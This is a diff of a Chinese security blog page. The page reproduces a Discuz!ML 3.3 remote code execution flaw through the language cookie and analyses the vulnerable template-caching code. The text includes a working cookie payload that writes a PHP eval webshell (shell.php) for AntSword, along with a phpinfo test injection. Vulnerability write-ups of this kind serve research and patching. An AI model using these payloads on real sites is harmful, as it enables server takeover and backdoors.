@@ -4,7 +4,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>斯文beast</title>
 <meta name="description" content="不在平静中灭亡~  " />
-<link rel="shortcut icon" href="http://www.svenbeast.com//favicon.ico?v=1581935936254">
+<link rel="shortcut icon" href="http://www.svenbeast.com//favicon.ico?v=1582079012028">
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
 <link href="https://cdn.remixicon.com/releases/v1.3.1/remixicon.css" rel="stylesheet">
 <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
@@ -33,7 +33,7 @@
       <div class="flex lg:block p-4 lg:px-0 items-center fixed lg:static lg:block top-0 right-0 left-0 bg-white z-50">
         <i class="remixicon-menu-2-line lg:mt-4 text-2xl cursor-pointer animated fadeIn" onclick="openMenu()"></i>
         <a href="http://www.svenbeast.com/">
-          <img class="animated fadeInLeft avatar rounded-lg mx-4 lg:mt-32 lg:mx-0 mt-0 lg:w-24 lg:h-24 w-12 w-12" src="http://www.svenbeast.com//images/avatar.png?v=1581935936254" alt="">
+          <img class="animated fadeInLeft avatar rounded-lg mx-4 lg:mt-32 lg:mx-0 mt-0 lg:w-24 lg:h-24 w-12 w-12" src="http://www.svenbeast.com//images/avatar.png?v=1582079012028" alt="">
         </a>
         <h1 class="animated fadeInLeft lg:text-4xl font-extrabold lg:mt-8 mt-0 text-xl" style="animation-delay: 0.2s">斯文beast</h1>
       </div>
@@ -121,7 +121,7 @@
 <p>下载源码后，解压至安装目录后访问:127.0.0.1/discuz!ml3.3/upload,进入此目标将开始安装</p>
 <p>因为本人已经安装好，就不在滚键盘了，直接下一步即可，最后写上本机的数据库连接密码，在设置管理员账号密码即可</p>
 <p>ps:安装后无图片显示，莫慌，不影响使用</p>
-<figure data-type="image" tabindex="1"><img src="http://www.svenbeast.com//post-images/1563443055749.png" alt=""></figure>
+<figure data-type="image" tabindex="1"><img src="http://www.svenbeast.com//post-images/1563443055749.png" alt="" loading="lazy"></figure>
 <h3 id="s3-代码执行">s3. 代码执行</h3>
 <ul>
 <li>
@@ -132,42 +132,42 @@
 </li>
 </ul>
 <p>抓包找到cookie的language的值修改为xxxx_xxxx_language=sc'.phpinfo().'，成功执行，这里的sc可以不带</p>
-<figure data-type="image" tabindex="2"><img src="http://www.svenbeast.com//post-images/1563443067475.png" alt=""></figure>
+<figure data-type="image" tabindex="2"><img src="http://www.svenbeast.com//post-images/1563443067475.png" alt="" loading="lazy"></figure>
 <ul>
 <li>构造一句话,连接蚁剑</li>
 </ul>
-<figure data-type="image" tabindex="3"><img src="http://www.svenbeast.com//post-images/1563443076681.png" alt=""></figure>
+<figure data-type="image" tabindex="3"><img src="http://www.svenbeast.com//post-images/1563443076681.png" alt="" loading="lazy"></figure>
 <p>payload：%27.%2Bfile_put_contents%28%27shell.php%27%2Curldecode%28%27%253C%253Fphp%2520eval%2528%2524_POST%255B%25221%2522%255D%2529%253B%253F%253E%27%29%29.%27</p>
 <p>实际为：'.+file_put_contents('shell.php',urldecode('<?php eval($_POST["1"]);?>')).'</p>
 <p>可看到路径下生成shell.php，连接密码为1<br>
-<img src="http://www.svenbeast.com//post-images/1563443087699.png" alt=""></p>
+<img src="http://www.svenbeast.com//post-images/1563443087699.png" alt="" loading="lazy"></p>
 <ul>
 <li>检测脚本：https://github.com/theLSA/discuz-ml-rce</li>
 </ul>
 <p>借用此作者的脚本，写的非常全，方便检测和验证</p>
 <h3 id="s4-分析">s4. 分析</h3>
 <p>在discuz!ml3.3\upload\source\module\portal的portal_index.php里存在着包含</p>
-<figure data-type="image" tabindex="4"><img src="http://www.svenbeast.com//post-images/1563443104649.png" alt=""></figure>
+<figure data-type="image" tabindex="4"><img src="http://www.svenbeast.com//post-images/1563443104649.png" alt="" loading="lazy"></figure>
 <p>跟踪template</p>
 <p>在discuz!ml3.3\upload\source\function的function_core.php文件中</p>
-<figure data-type="image" tabindex="5"><img src="http://www.svenbeast.com//post-images/1563443114587.png" alt=""></figure>
+<figure data-type="image" tabindex="5"><img src="http://www.svenbeast.com//post-images/1563443114587.png" alt="" loading="lazy"></figure>
 <p>他的返回值为DISCUZ_ROOT.<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>c</mi><mi>a</mi><mi>c</mi><mi>h</mi><mi>e</mi><mi>f</mi><mi>i</mi><mi>l</mi><mi>e</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">而</mi></mrow><annotation encoding="application/x-tex">cachefile，而</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">c</span><span class="mord mathdefault">a</span><span class="mord mathdefault">c</span><span class="mord mathdefault">h</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">e</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">而</span></span></span></span>cachefile在上面也有，可看出由各变量来进行组成的，其中的DISCUZ_LANG为可控制变量</p>
 <p>discuz!ml3.3\upload\source\class\discuz下的discuz_application.php文件</p>
-<p><img src="http://www.svenbeast.com//post-images/1563443125491.png" alt=""><br>
+<p><img src="http://www.svenbeast.com//post-images/1563443125491.png" alt="" loading="lazy"><br>
 ↑ 可看出这里直接将值传入到lng变量，继续跟踪</p>
-<figure data-type="image" tabindex="6"><img src="http://www.svenbeast.com//post-images/1563443135323.png" alt=""></figure>
+<figure data-type="image" tabindex="6"><img src="http://www.svenbeast.com//post-images/1563443135323.png" alt="" loading="lazy"></figure>
 <p>↑ $lng直接赋给DISCUZ_LANG，所以DISCUZ_LANG常量为可控</p>
 <p>因此payload通过修改cookie里的language字段内容传入，目前已经控制了文件名字，而Discuz会将我们写入的存入缓存，真正包含的是缓存文件</p>
 <p>写入的缓存文件存在discuz!ml3.3\upload\data\template</p>
-<p><img src="http://www.svenbeast.com//post-images/1563443153930.png" alt=""><br>
+<p><img src="http://www.svenbeast.com//post-images/1563443153930.png" alt="" loading="lazy"><br>
 ↑ debug的时候写入的缓存文件</p>
-<p><img src="http://www.svenbeast.com//post-images/1563443174804.png" alt=""><br>
-<img src="http://www.svenbeast.com//post-images/1563443179694.png" alt=""></p>
+<p><img src="http://www.svenbeast.com//post-images/1563443174804.png" alt="" loading="lazy"><br>
+<img src="http://www.svenbeast.com//post-images/1563443179694.png" alt="" loading="lazy"></p>
 <p>↑ checktplrefresh()函数中将<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>c</mi><mi>a</mi><mi>c</mi><mi>h</mi><mi>e</mi><mi>f</mi><mi>i</mi><mi>l</mi><mi>e</mi><mi mathvariant="normal">传</mi><mi mathvariant="normal">入</mi><mi>p</mi><mi>a</mi><mi>r</mi><mi>s</mi><msub><mi>e</mi><mi>t</mi></msub><mi>e</mi><mi>m</mi><mi>p</mi><mi>l</mi><mi>a</mi><mi>t</mi><mi>e</mi><mo>(</mo><mo>)</mo><mo separator="true">,</mo><mi mathvariant="normal">然</mi><mi mathvariant="normal">后</mi><mi mathvariant="normal">拼</mi><mi mathvariant="normal">接</mi><mi mathvariant="normal">给</mi></mrow><annotation encoding="application/x-tex">cachefile传入parse_template(),然后拼接给</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">c</span><span class="mord mathdefault">a</span><span class="mord mathdefault">c</span><span class="mord mathdefault">h</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">e</span><span class="mord cjk_fallback">传</span><span class="mord cjk_fallback">入</span><span class="mord mathdefault">p</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">s</span><span class="mord"><span class="mord mathdefault">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2805559999999999em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault">e</span><span class="mord mathdefault">m</span><span class="mord mathdefault">p</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">a</span><span class="mord mathdefault">t</span><span class="mord mathdefault">e</span><span class="mopen">(</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">然</span><span class="mord cjk_fallback">后</span><span class="mord cjk_fallback">拼</span><span class="mord cjk_fallback">接</span><span class="mord cjk_fallback">给</span></span></span></span>headeradd，接着拼接给$template</p>
-<p><img src="http://www.svenbeast.com//post-images/1563443191459.png" alt=""><br>
+<p><img src="http://www.svenbeast.com//post-images/1563443191459.png" alt="" loading="lazy"><br>
 ↑ 最后将$template写入到缓存文件，也就是上面说的那个目录下</p>
 <p>终于被include包含执行</p>
-<figure data-type="image" tabindex="7"><img src="http://www.svenbeast.com//post-images/1563443317792.png" alt=""></figure>
+<figure data-type="image" tabindex="7"><img src="http://www.svenbeast.com//post-images/1563443317792.png" alt="" loading="lazy"></figure>
 <ul>
 <li>总结：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>l</mi><mi>a</mi><mi>n</mi><mi>g</mi><mi>u</mi><mi>a</mi><mi>g</mi><mi>e</mi><mi mathvariant="normal">可</mi><mi mathvariant="normal">控</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">传</mi><mi mathvariant="normal">给</mi></mrow><annotation encoding="application/x-tex">language可控，传给</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">a</span><span class="mord mathdefault">n</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">u</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">e</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">控</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">传</span><span class="mord cjk_fallback">给</span></span></span></span>template，生成缓存文件后，又被include_once包含，造成RCE</li>
 </ul>
@@ -182,11 +182,11 @@
         </div>
 
         
-          <a class="animated fadeInUp p-2 items-center text-sm text-gray-700 border hover:bg-gray-300 leading-none rounded-full flex lg:inline-flex m-4 " href="http://www.svenbeast.com//tag/wjQYmk5ed">
+          <a class="animated fadeInUp p-2 items-center text-sm text-gray-700 border hover:bg-gray-300 leading-none rounded-full flex lg:inline-flex m-4 " href="http://www.svenbeast.com/tag/wjQYmk5ed/">
             <span class="flex-auto">Discuz!ML</span>
           </a>
         
-          <a class="animated fadeInUp p-2 items-center text-sm text-gray-700 border hover:bg-gray-300 leading-none rounded-full flex lg:inline-flex m-4 " href="http://www.svenbeast.com//tag/_fczXccA_">
+          <a class="animated fadeInUp p-2 items-center text-sm text-gray-700 border hover:bg-gray-300 leading-none rounded-full flex lg:inline-flex m-4 " href="http://www.svenbeast.com/tag/_fczXccA_/">
             <span class="flex-auto">poc</span>
           </a>
         
@@ -195,7 +195,7 @@
         <div class="flex justify-between py-8">
           
             <div class="prev-post">
-              <a href="http://www.svenbeast.com//post/fasterxml-jackson-yuan-cheng-ming-ling-zhi-xing-lou-dong-fu-xian-cve-2019-12384">
+              <a href="http://www.svenbeast.com/post/fasterxml-jackson-yuan-cheng-ming-ling-zhi-xing-lou-dong-fu-xian-cve-2019-12384/">
                 <h3 class="post-title">
                   <i class="remixicon-arrow-left-line"></i>
                   FasterXML Jackson远程命令执行漏洞（复现CVE-2019-12384）
@@ -206,7 +206,7 @@
 
           
             <div class="next-post">
-              <a href="http://www.svenbeast.com//post/zhi-yuan-oa-pi-liang-getshell-shua-src">
+              <a href="http://www.svenbeast.com/post/zhi-yuan-oa-pi-liang-getshell-shua-src/">
                 <h3 class="post-title">
                   致远OA批量getshell刷SRC
                   <i class="remixicon-arrow-right-line"></i>
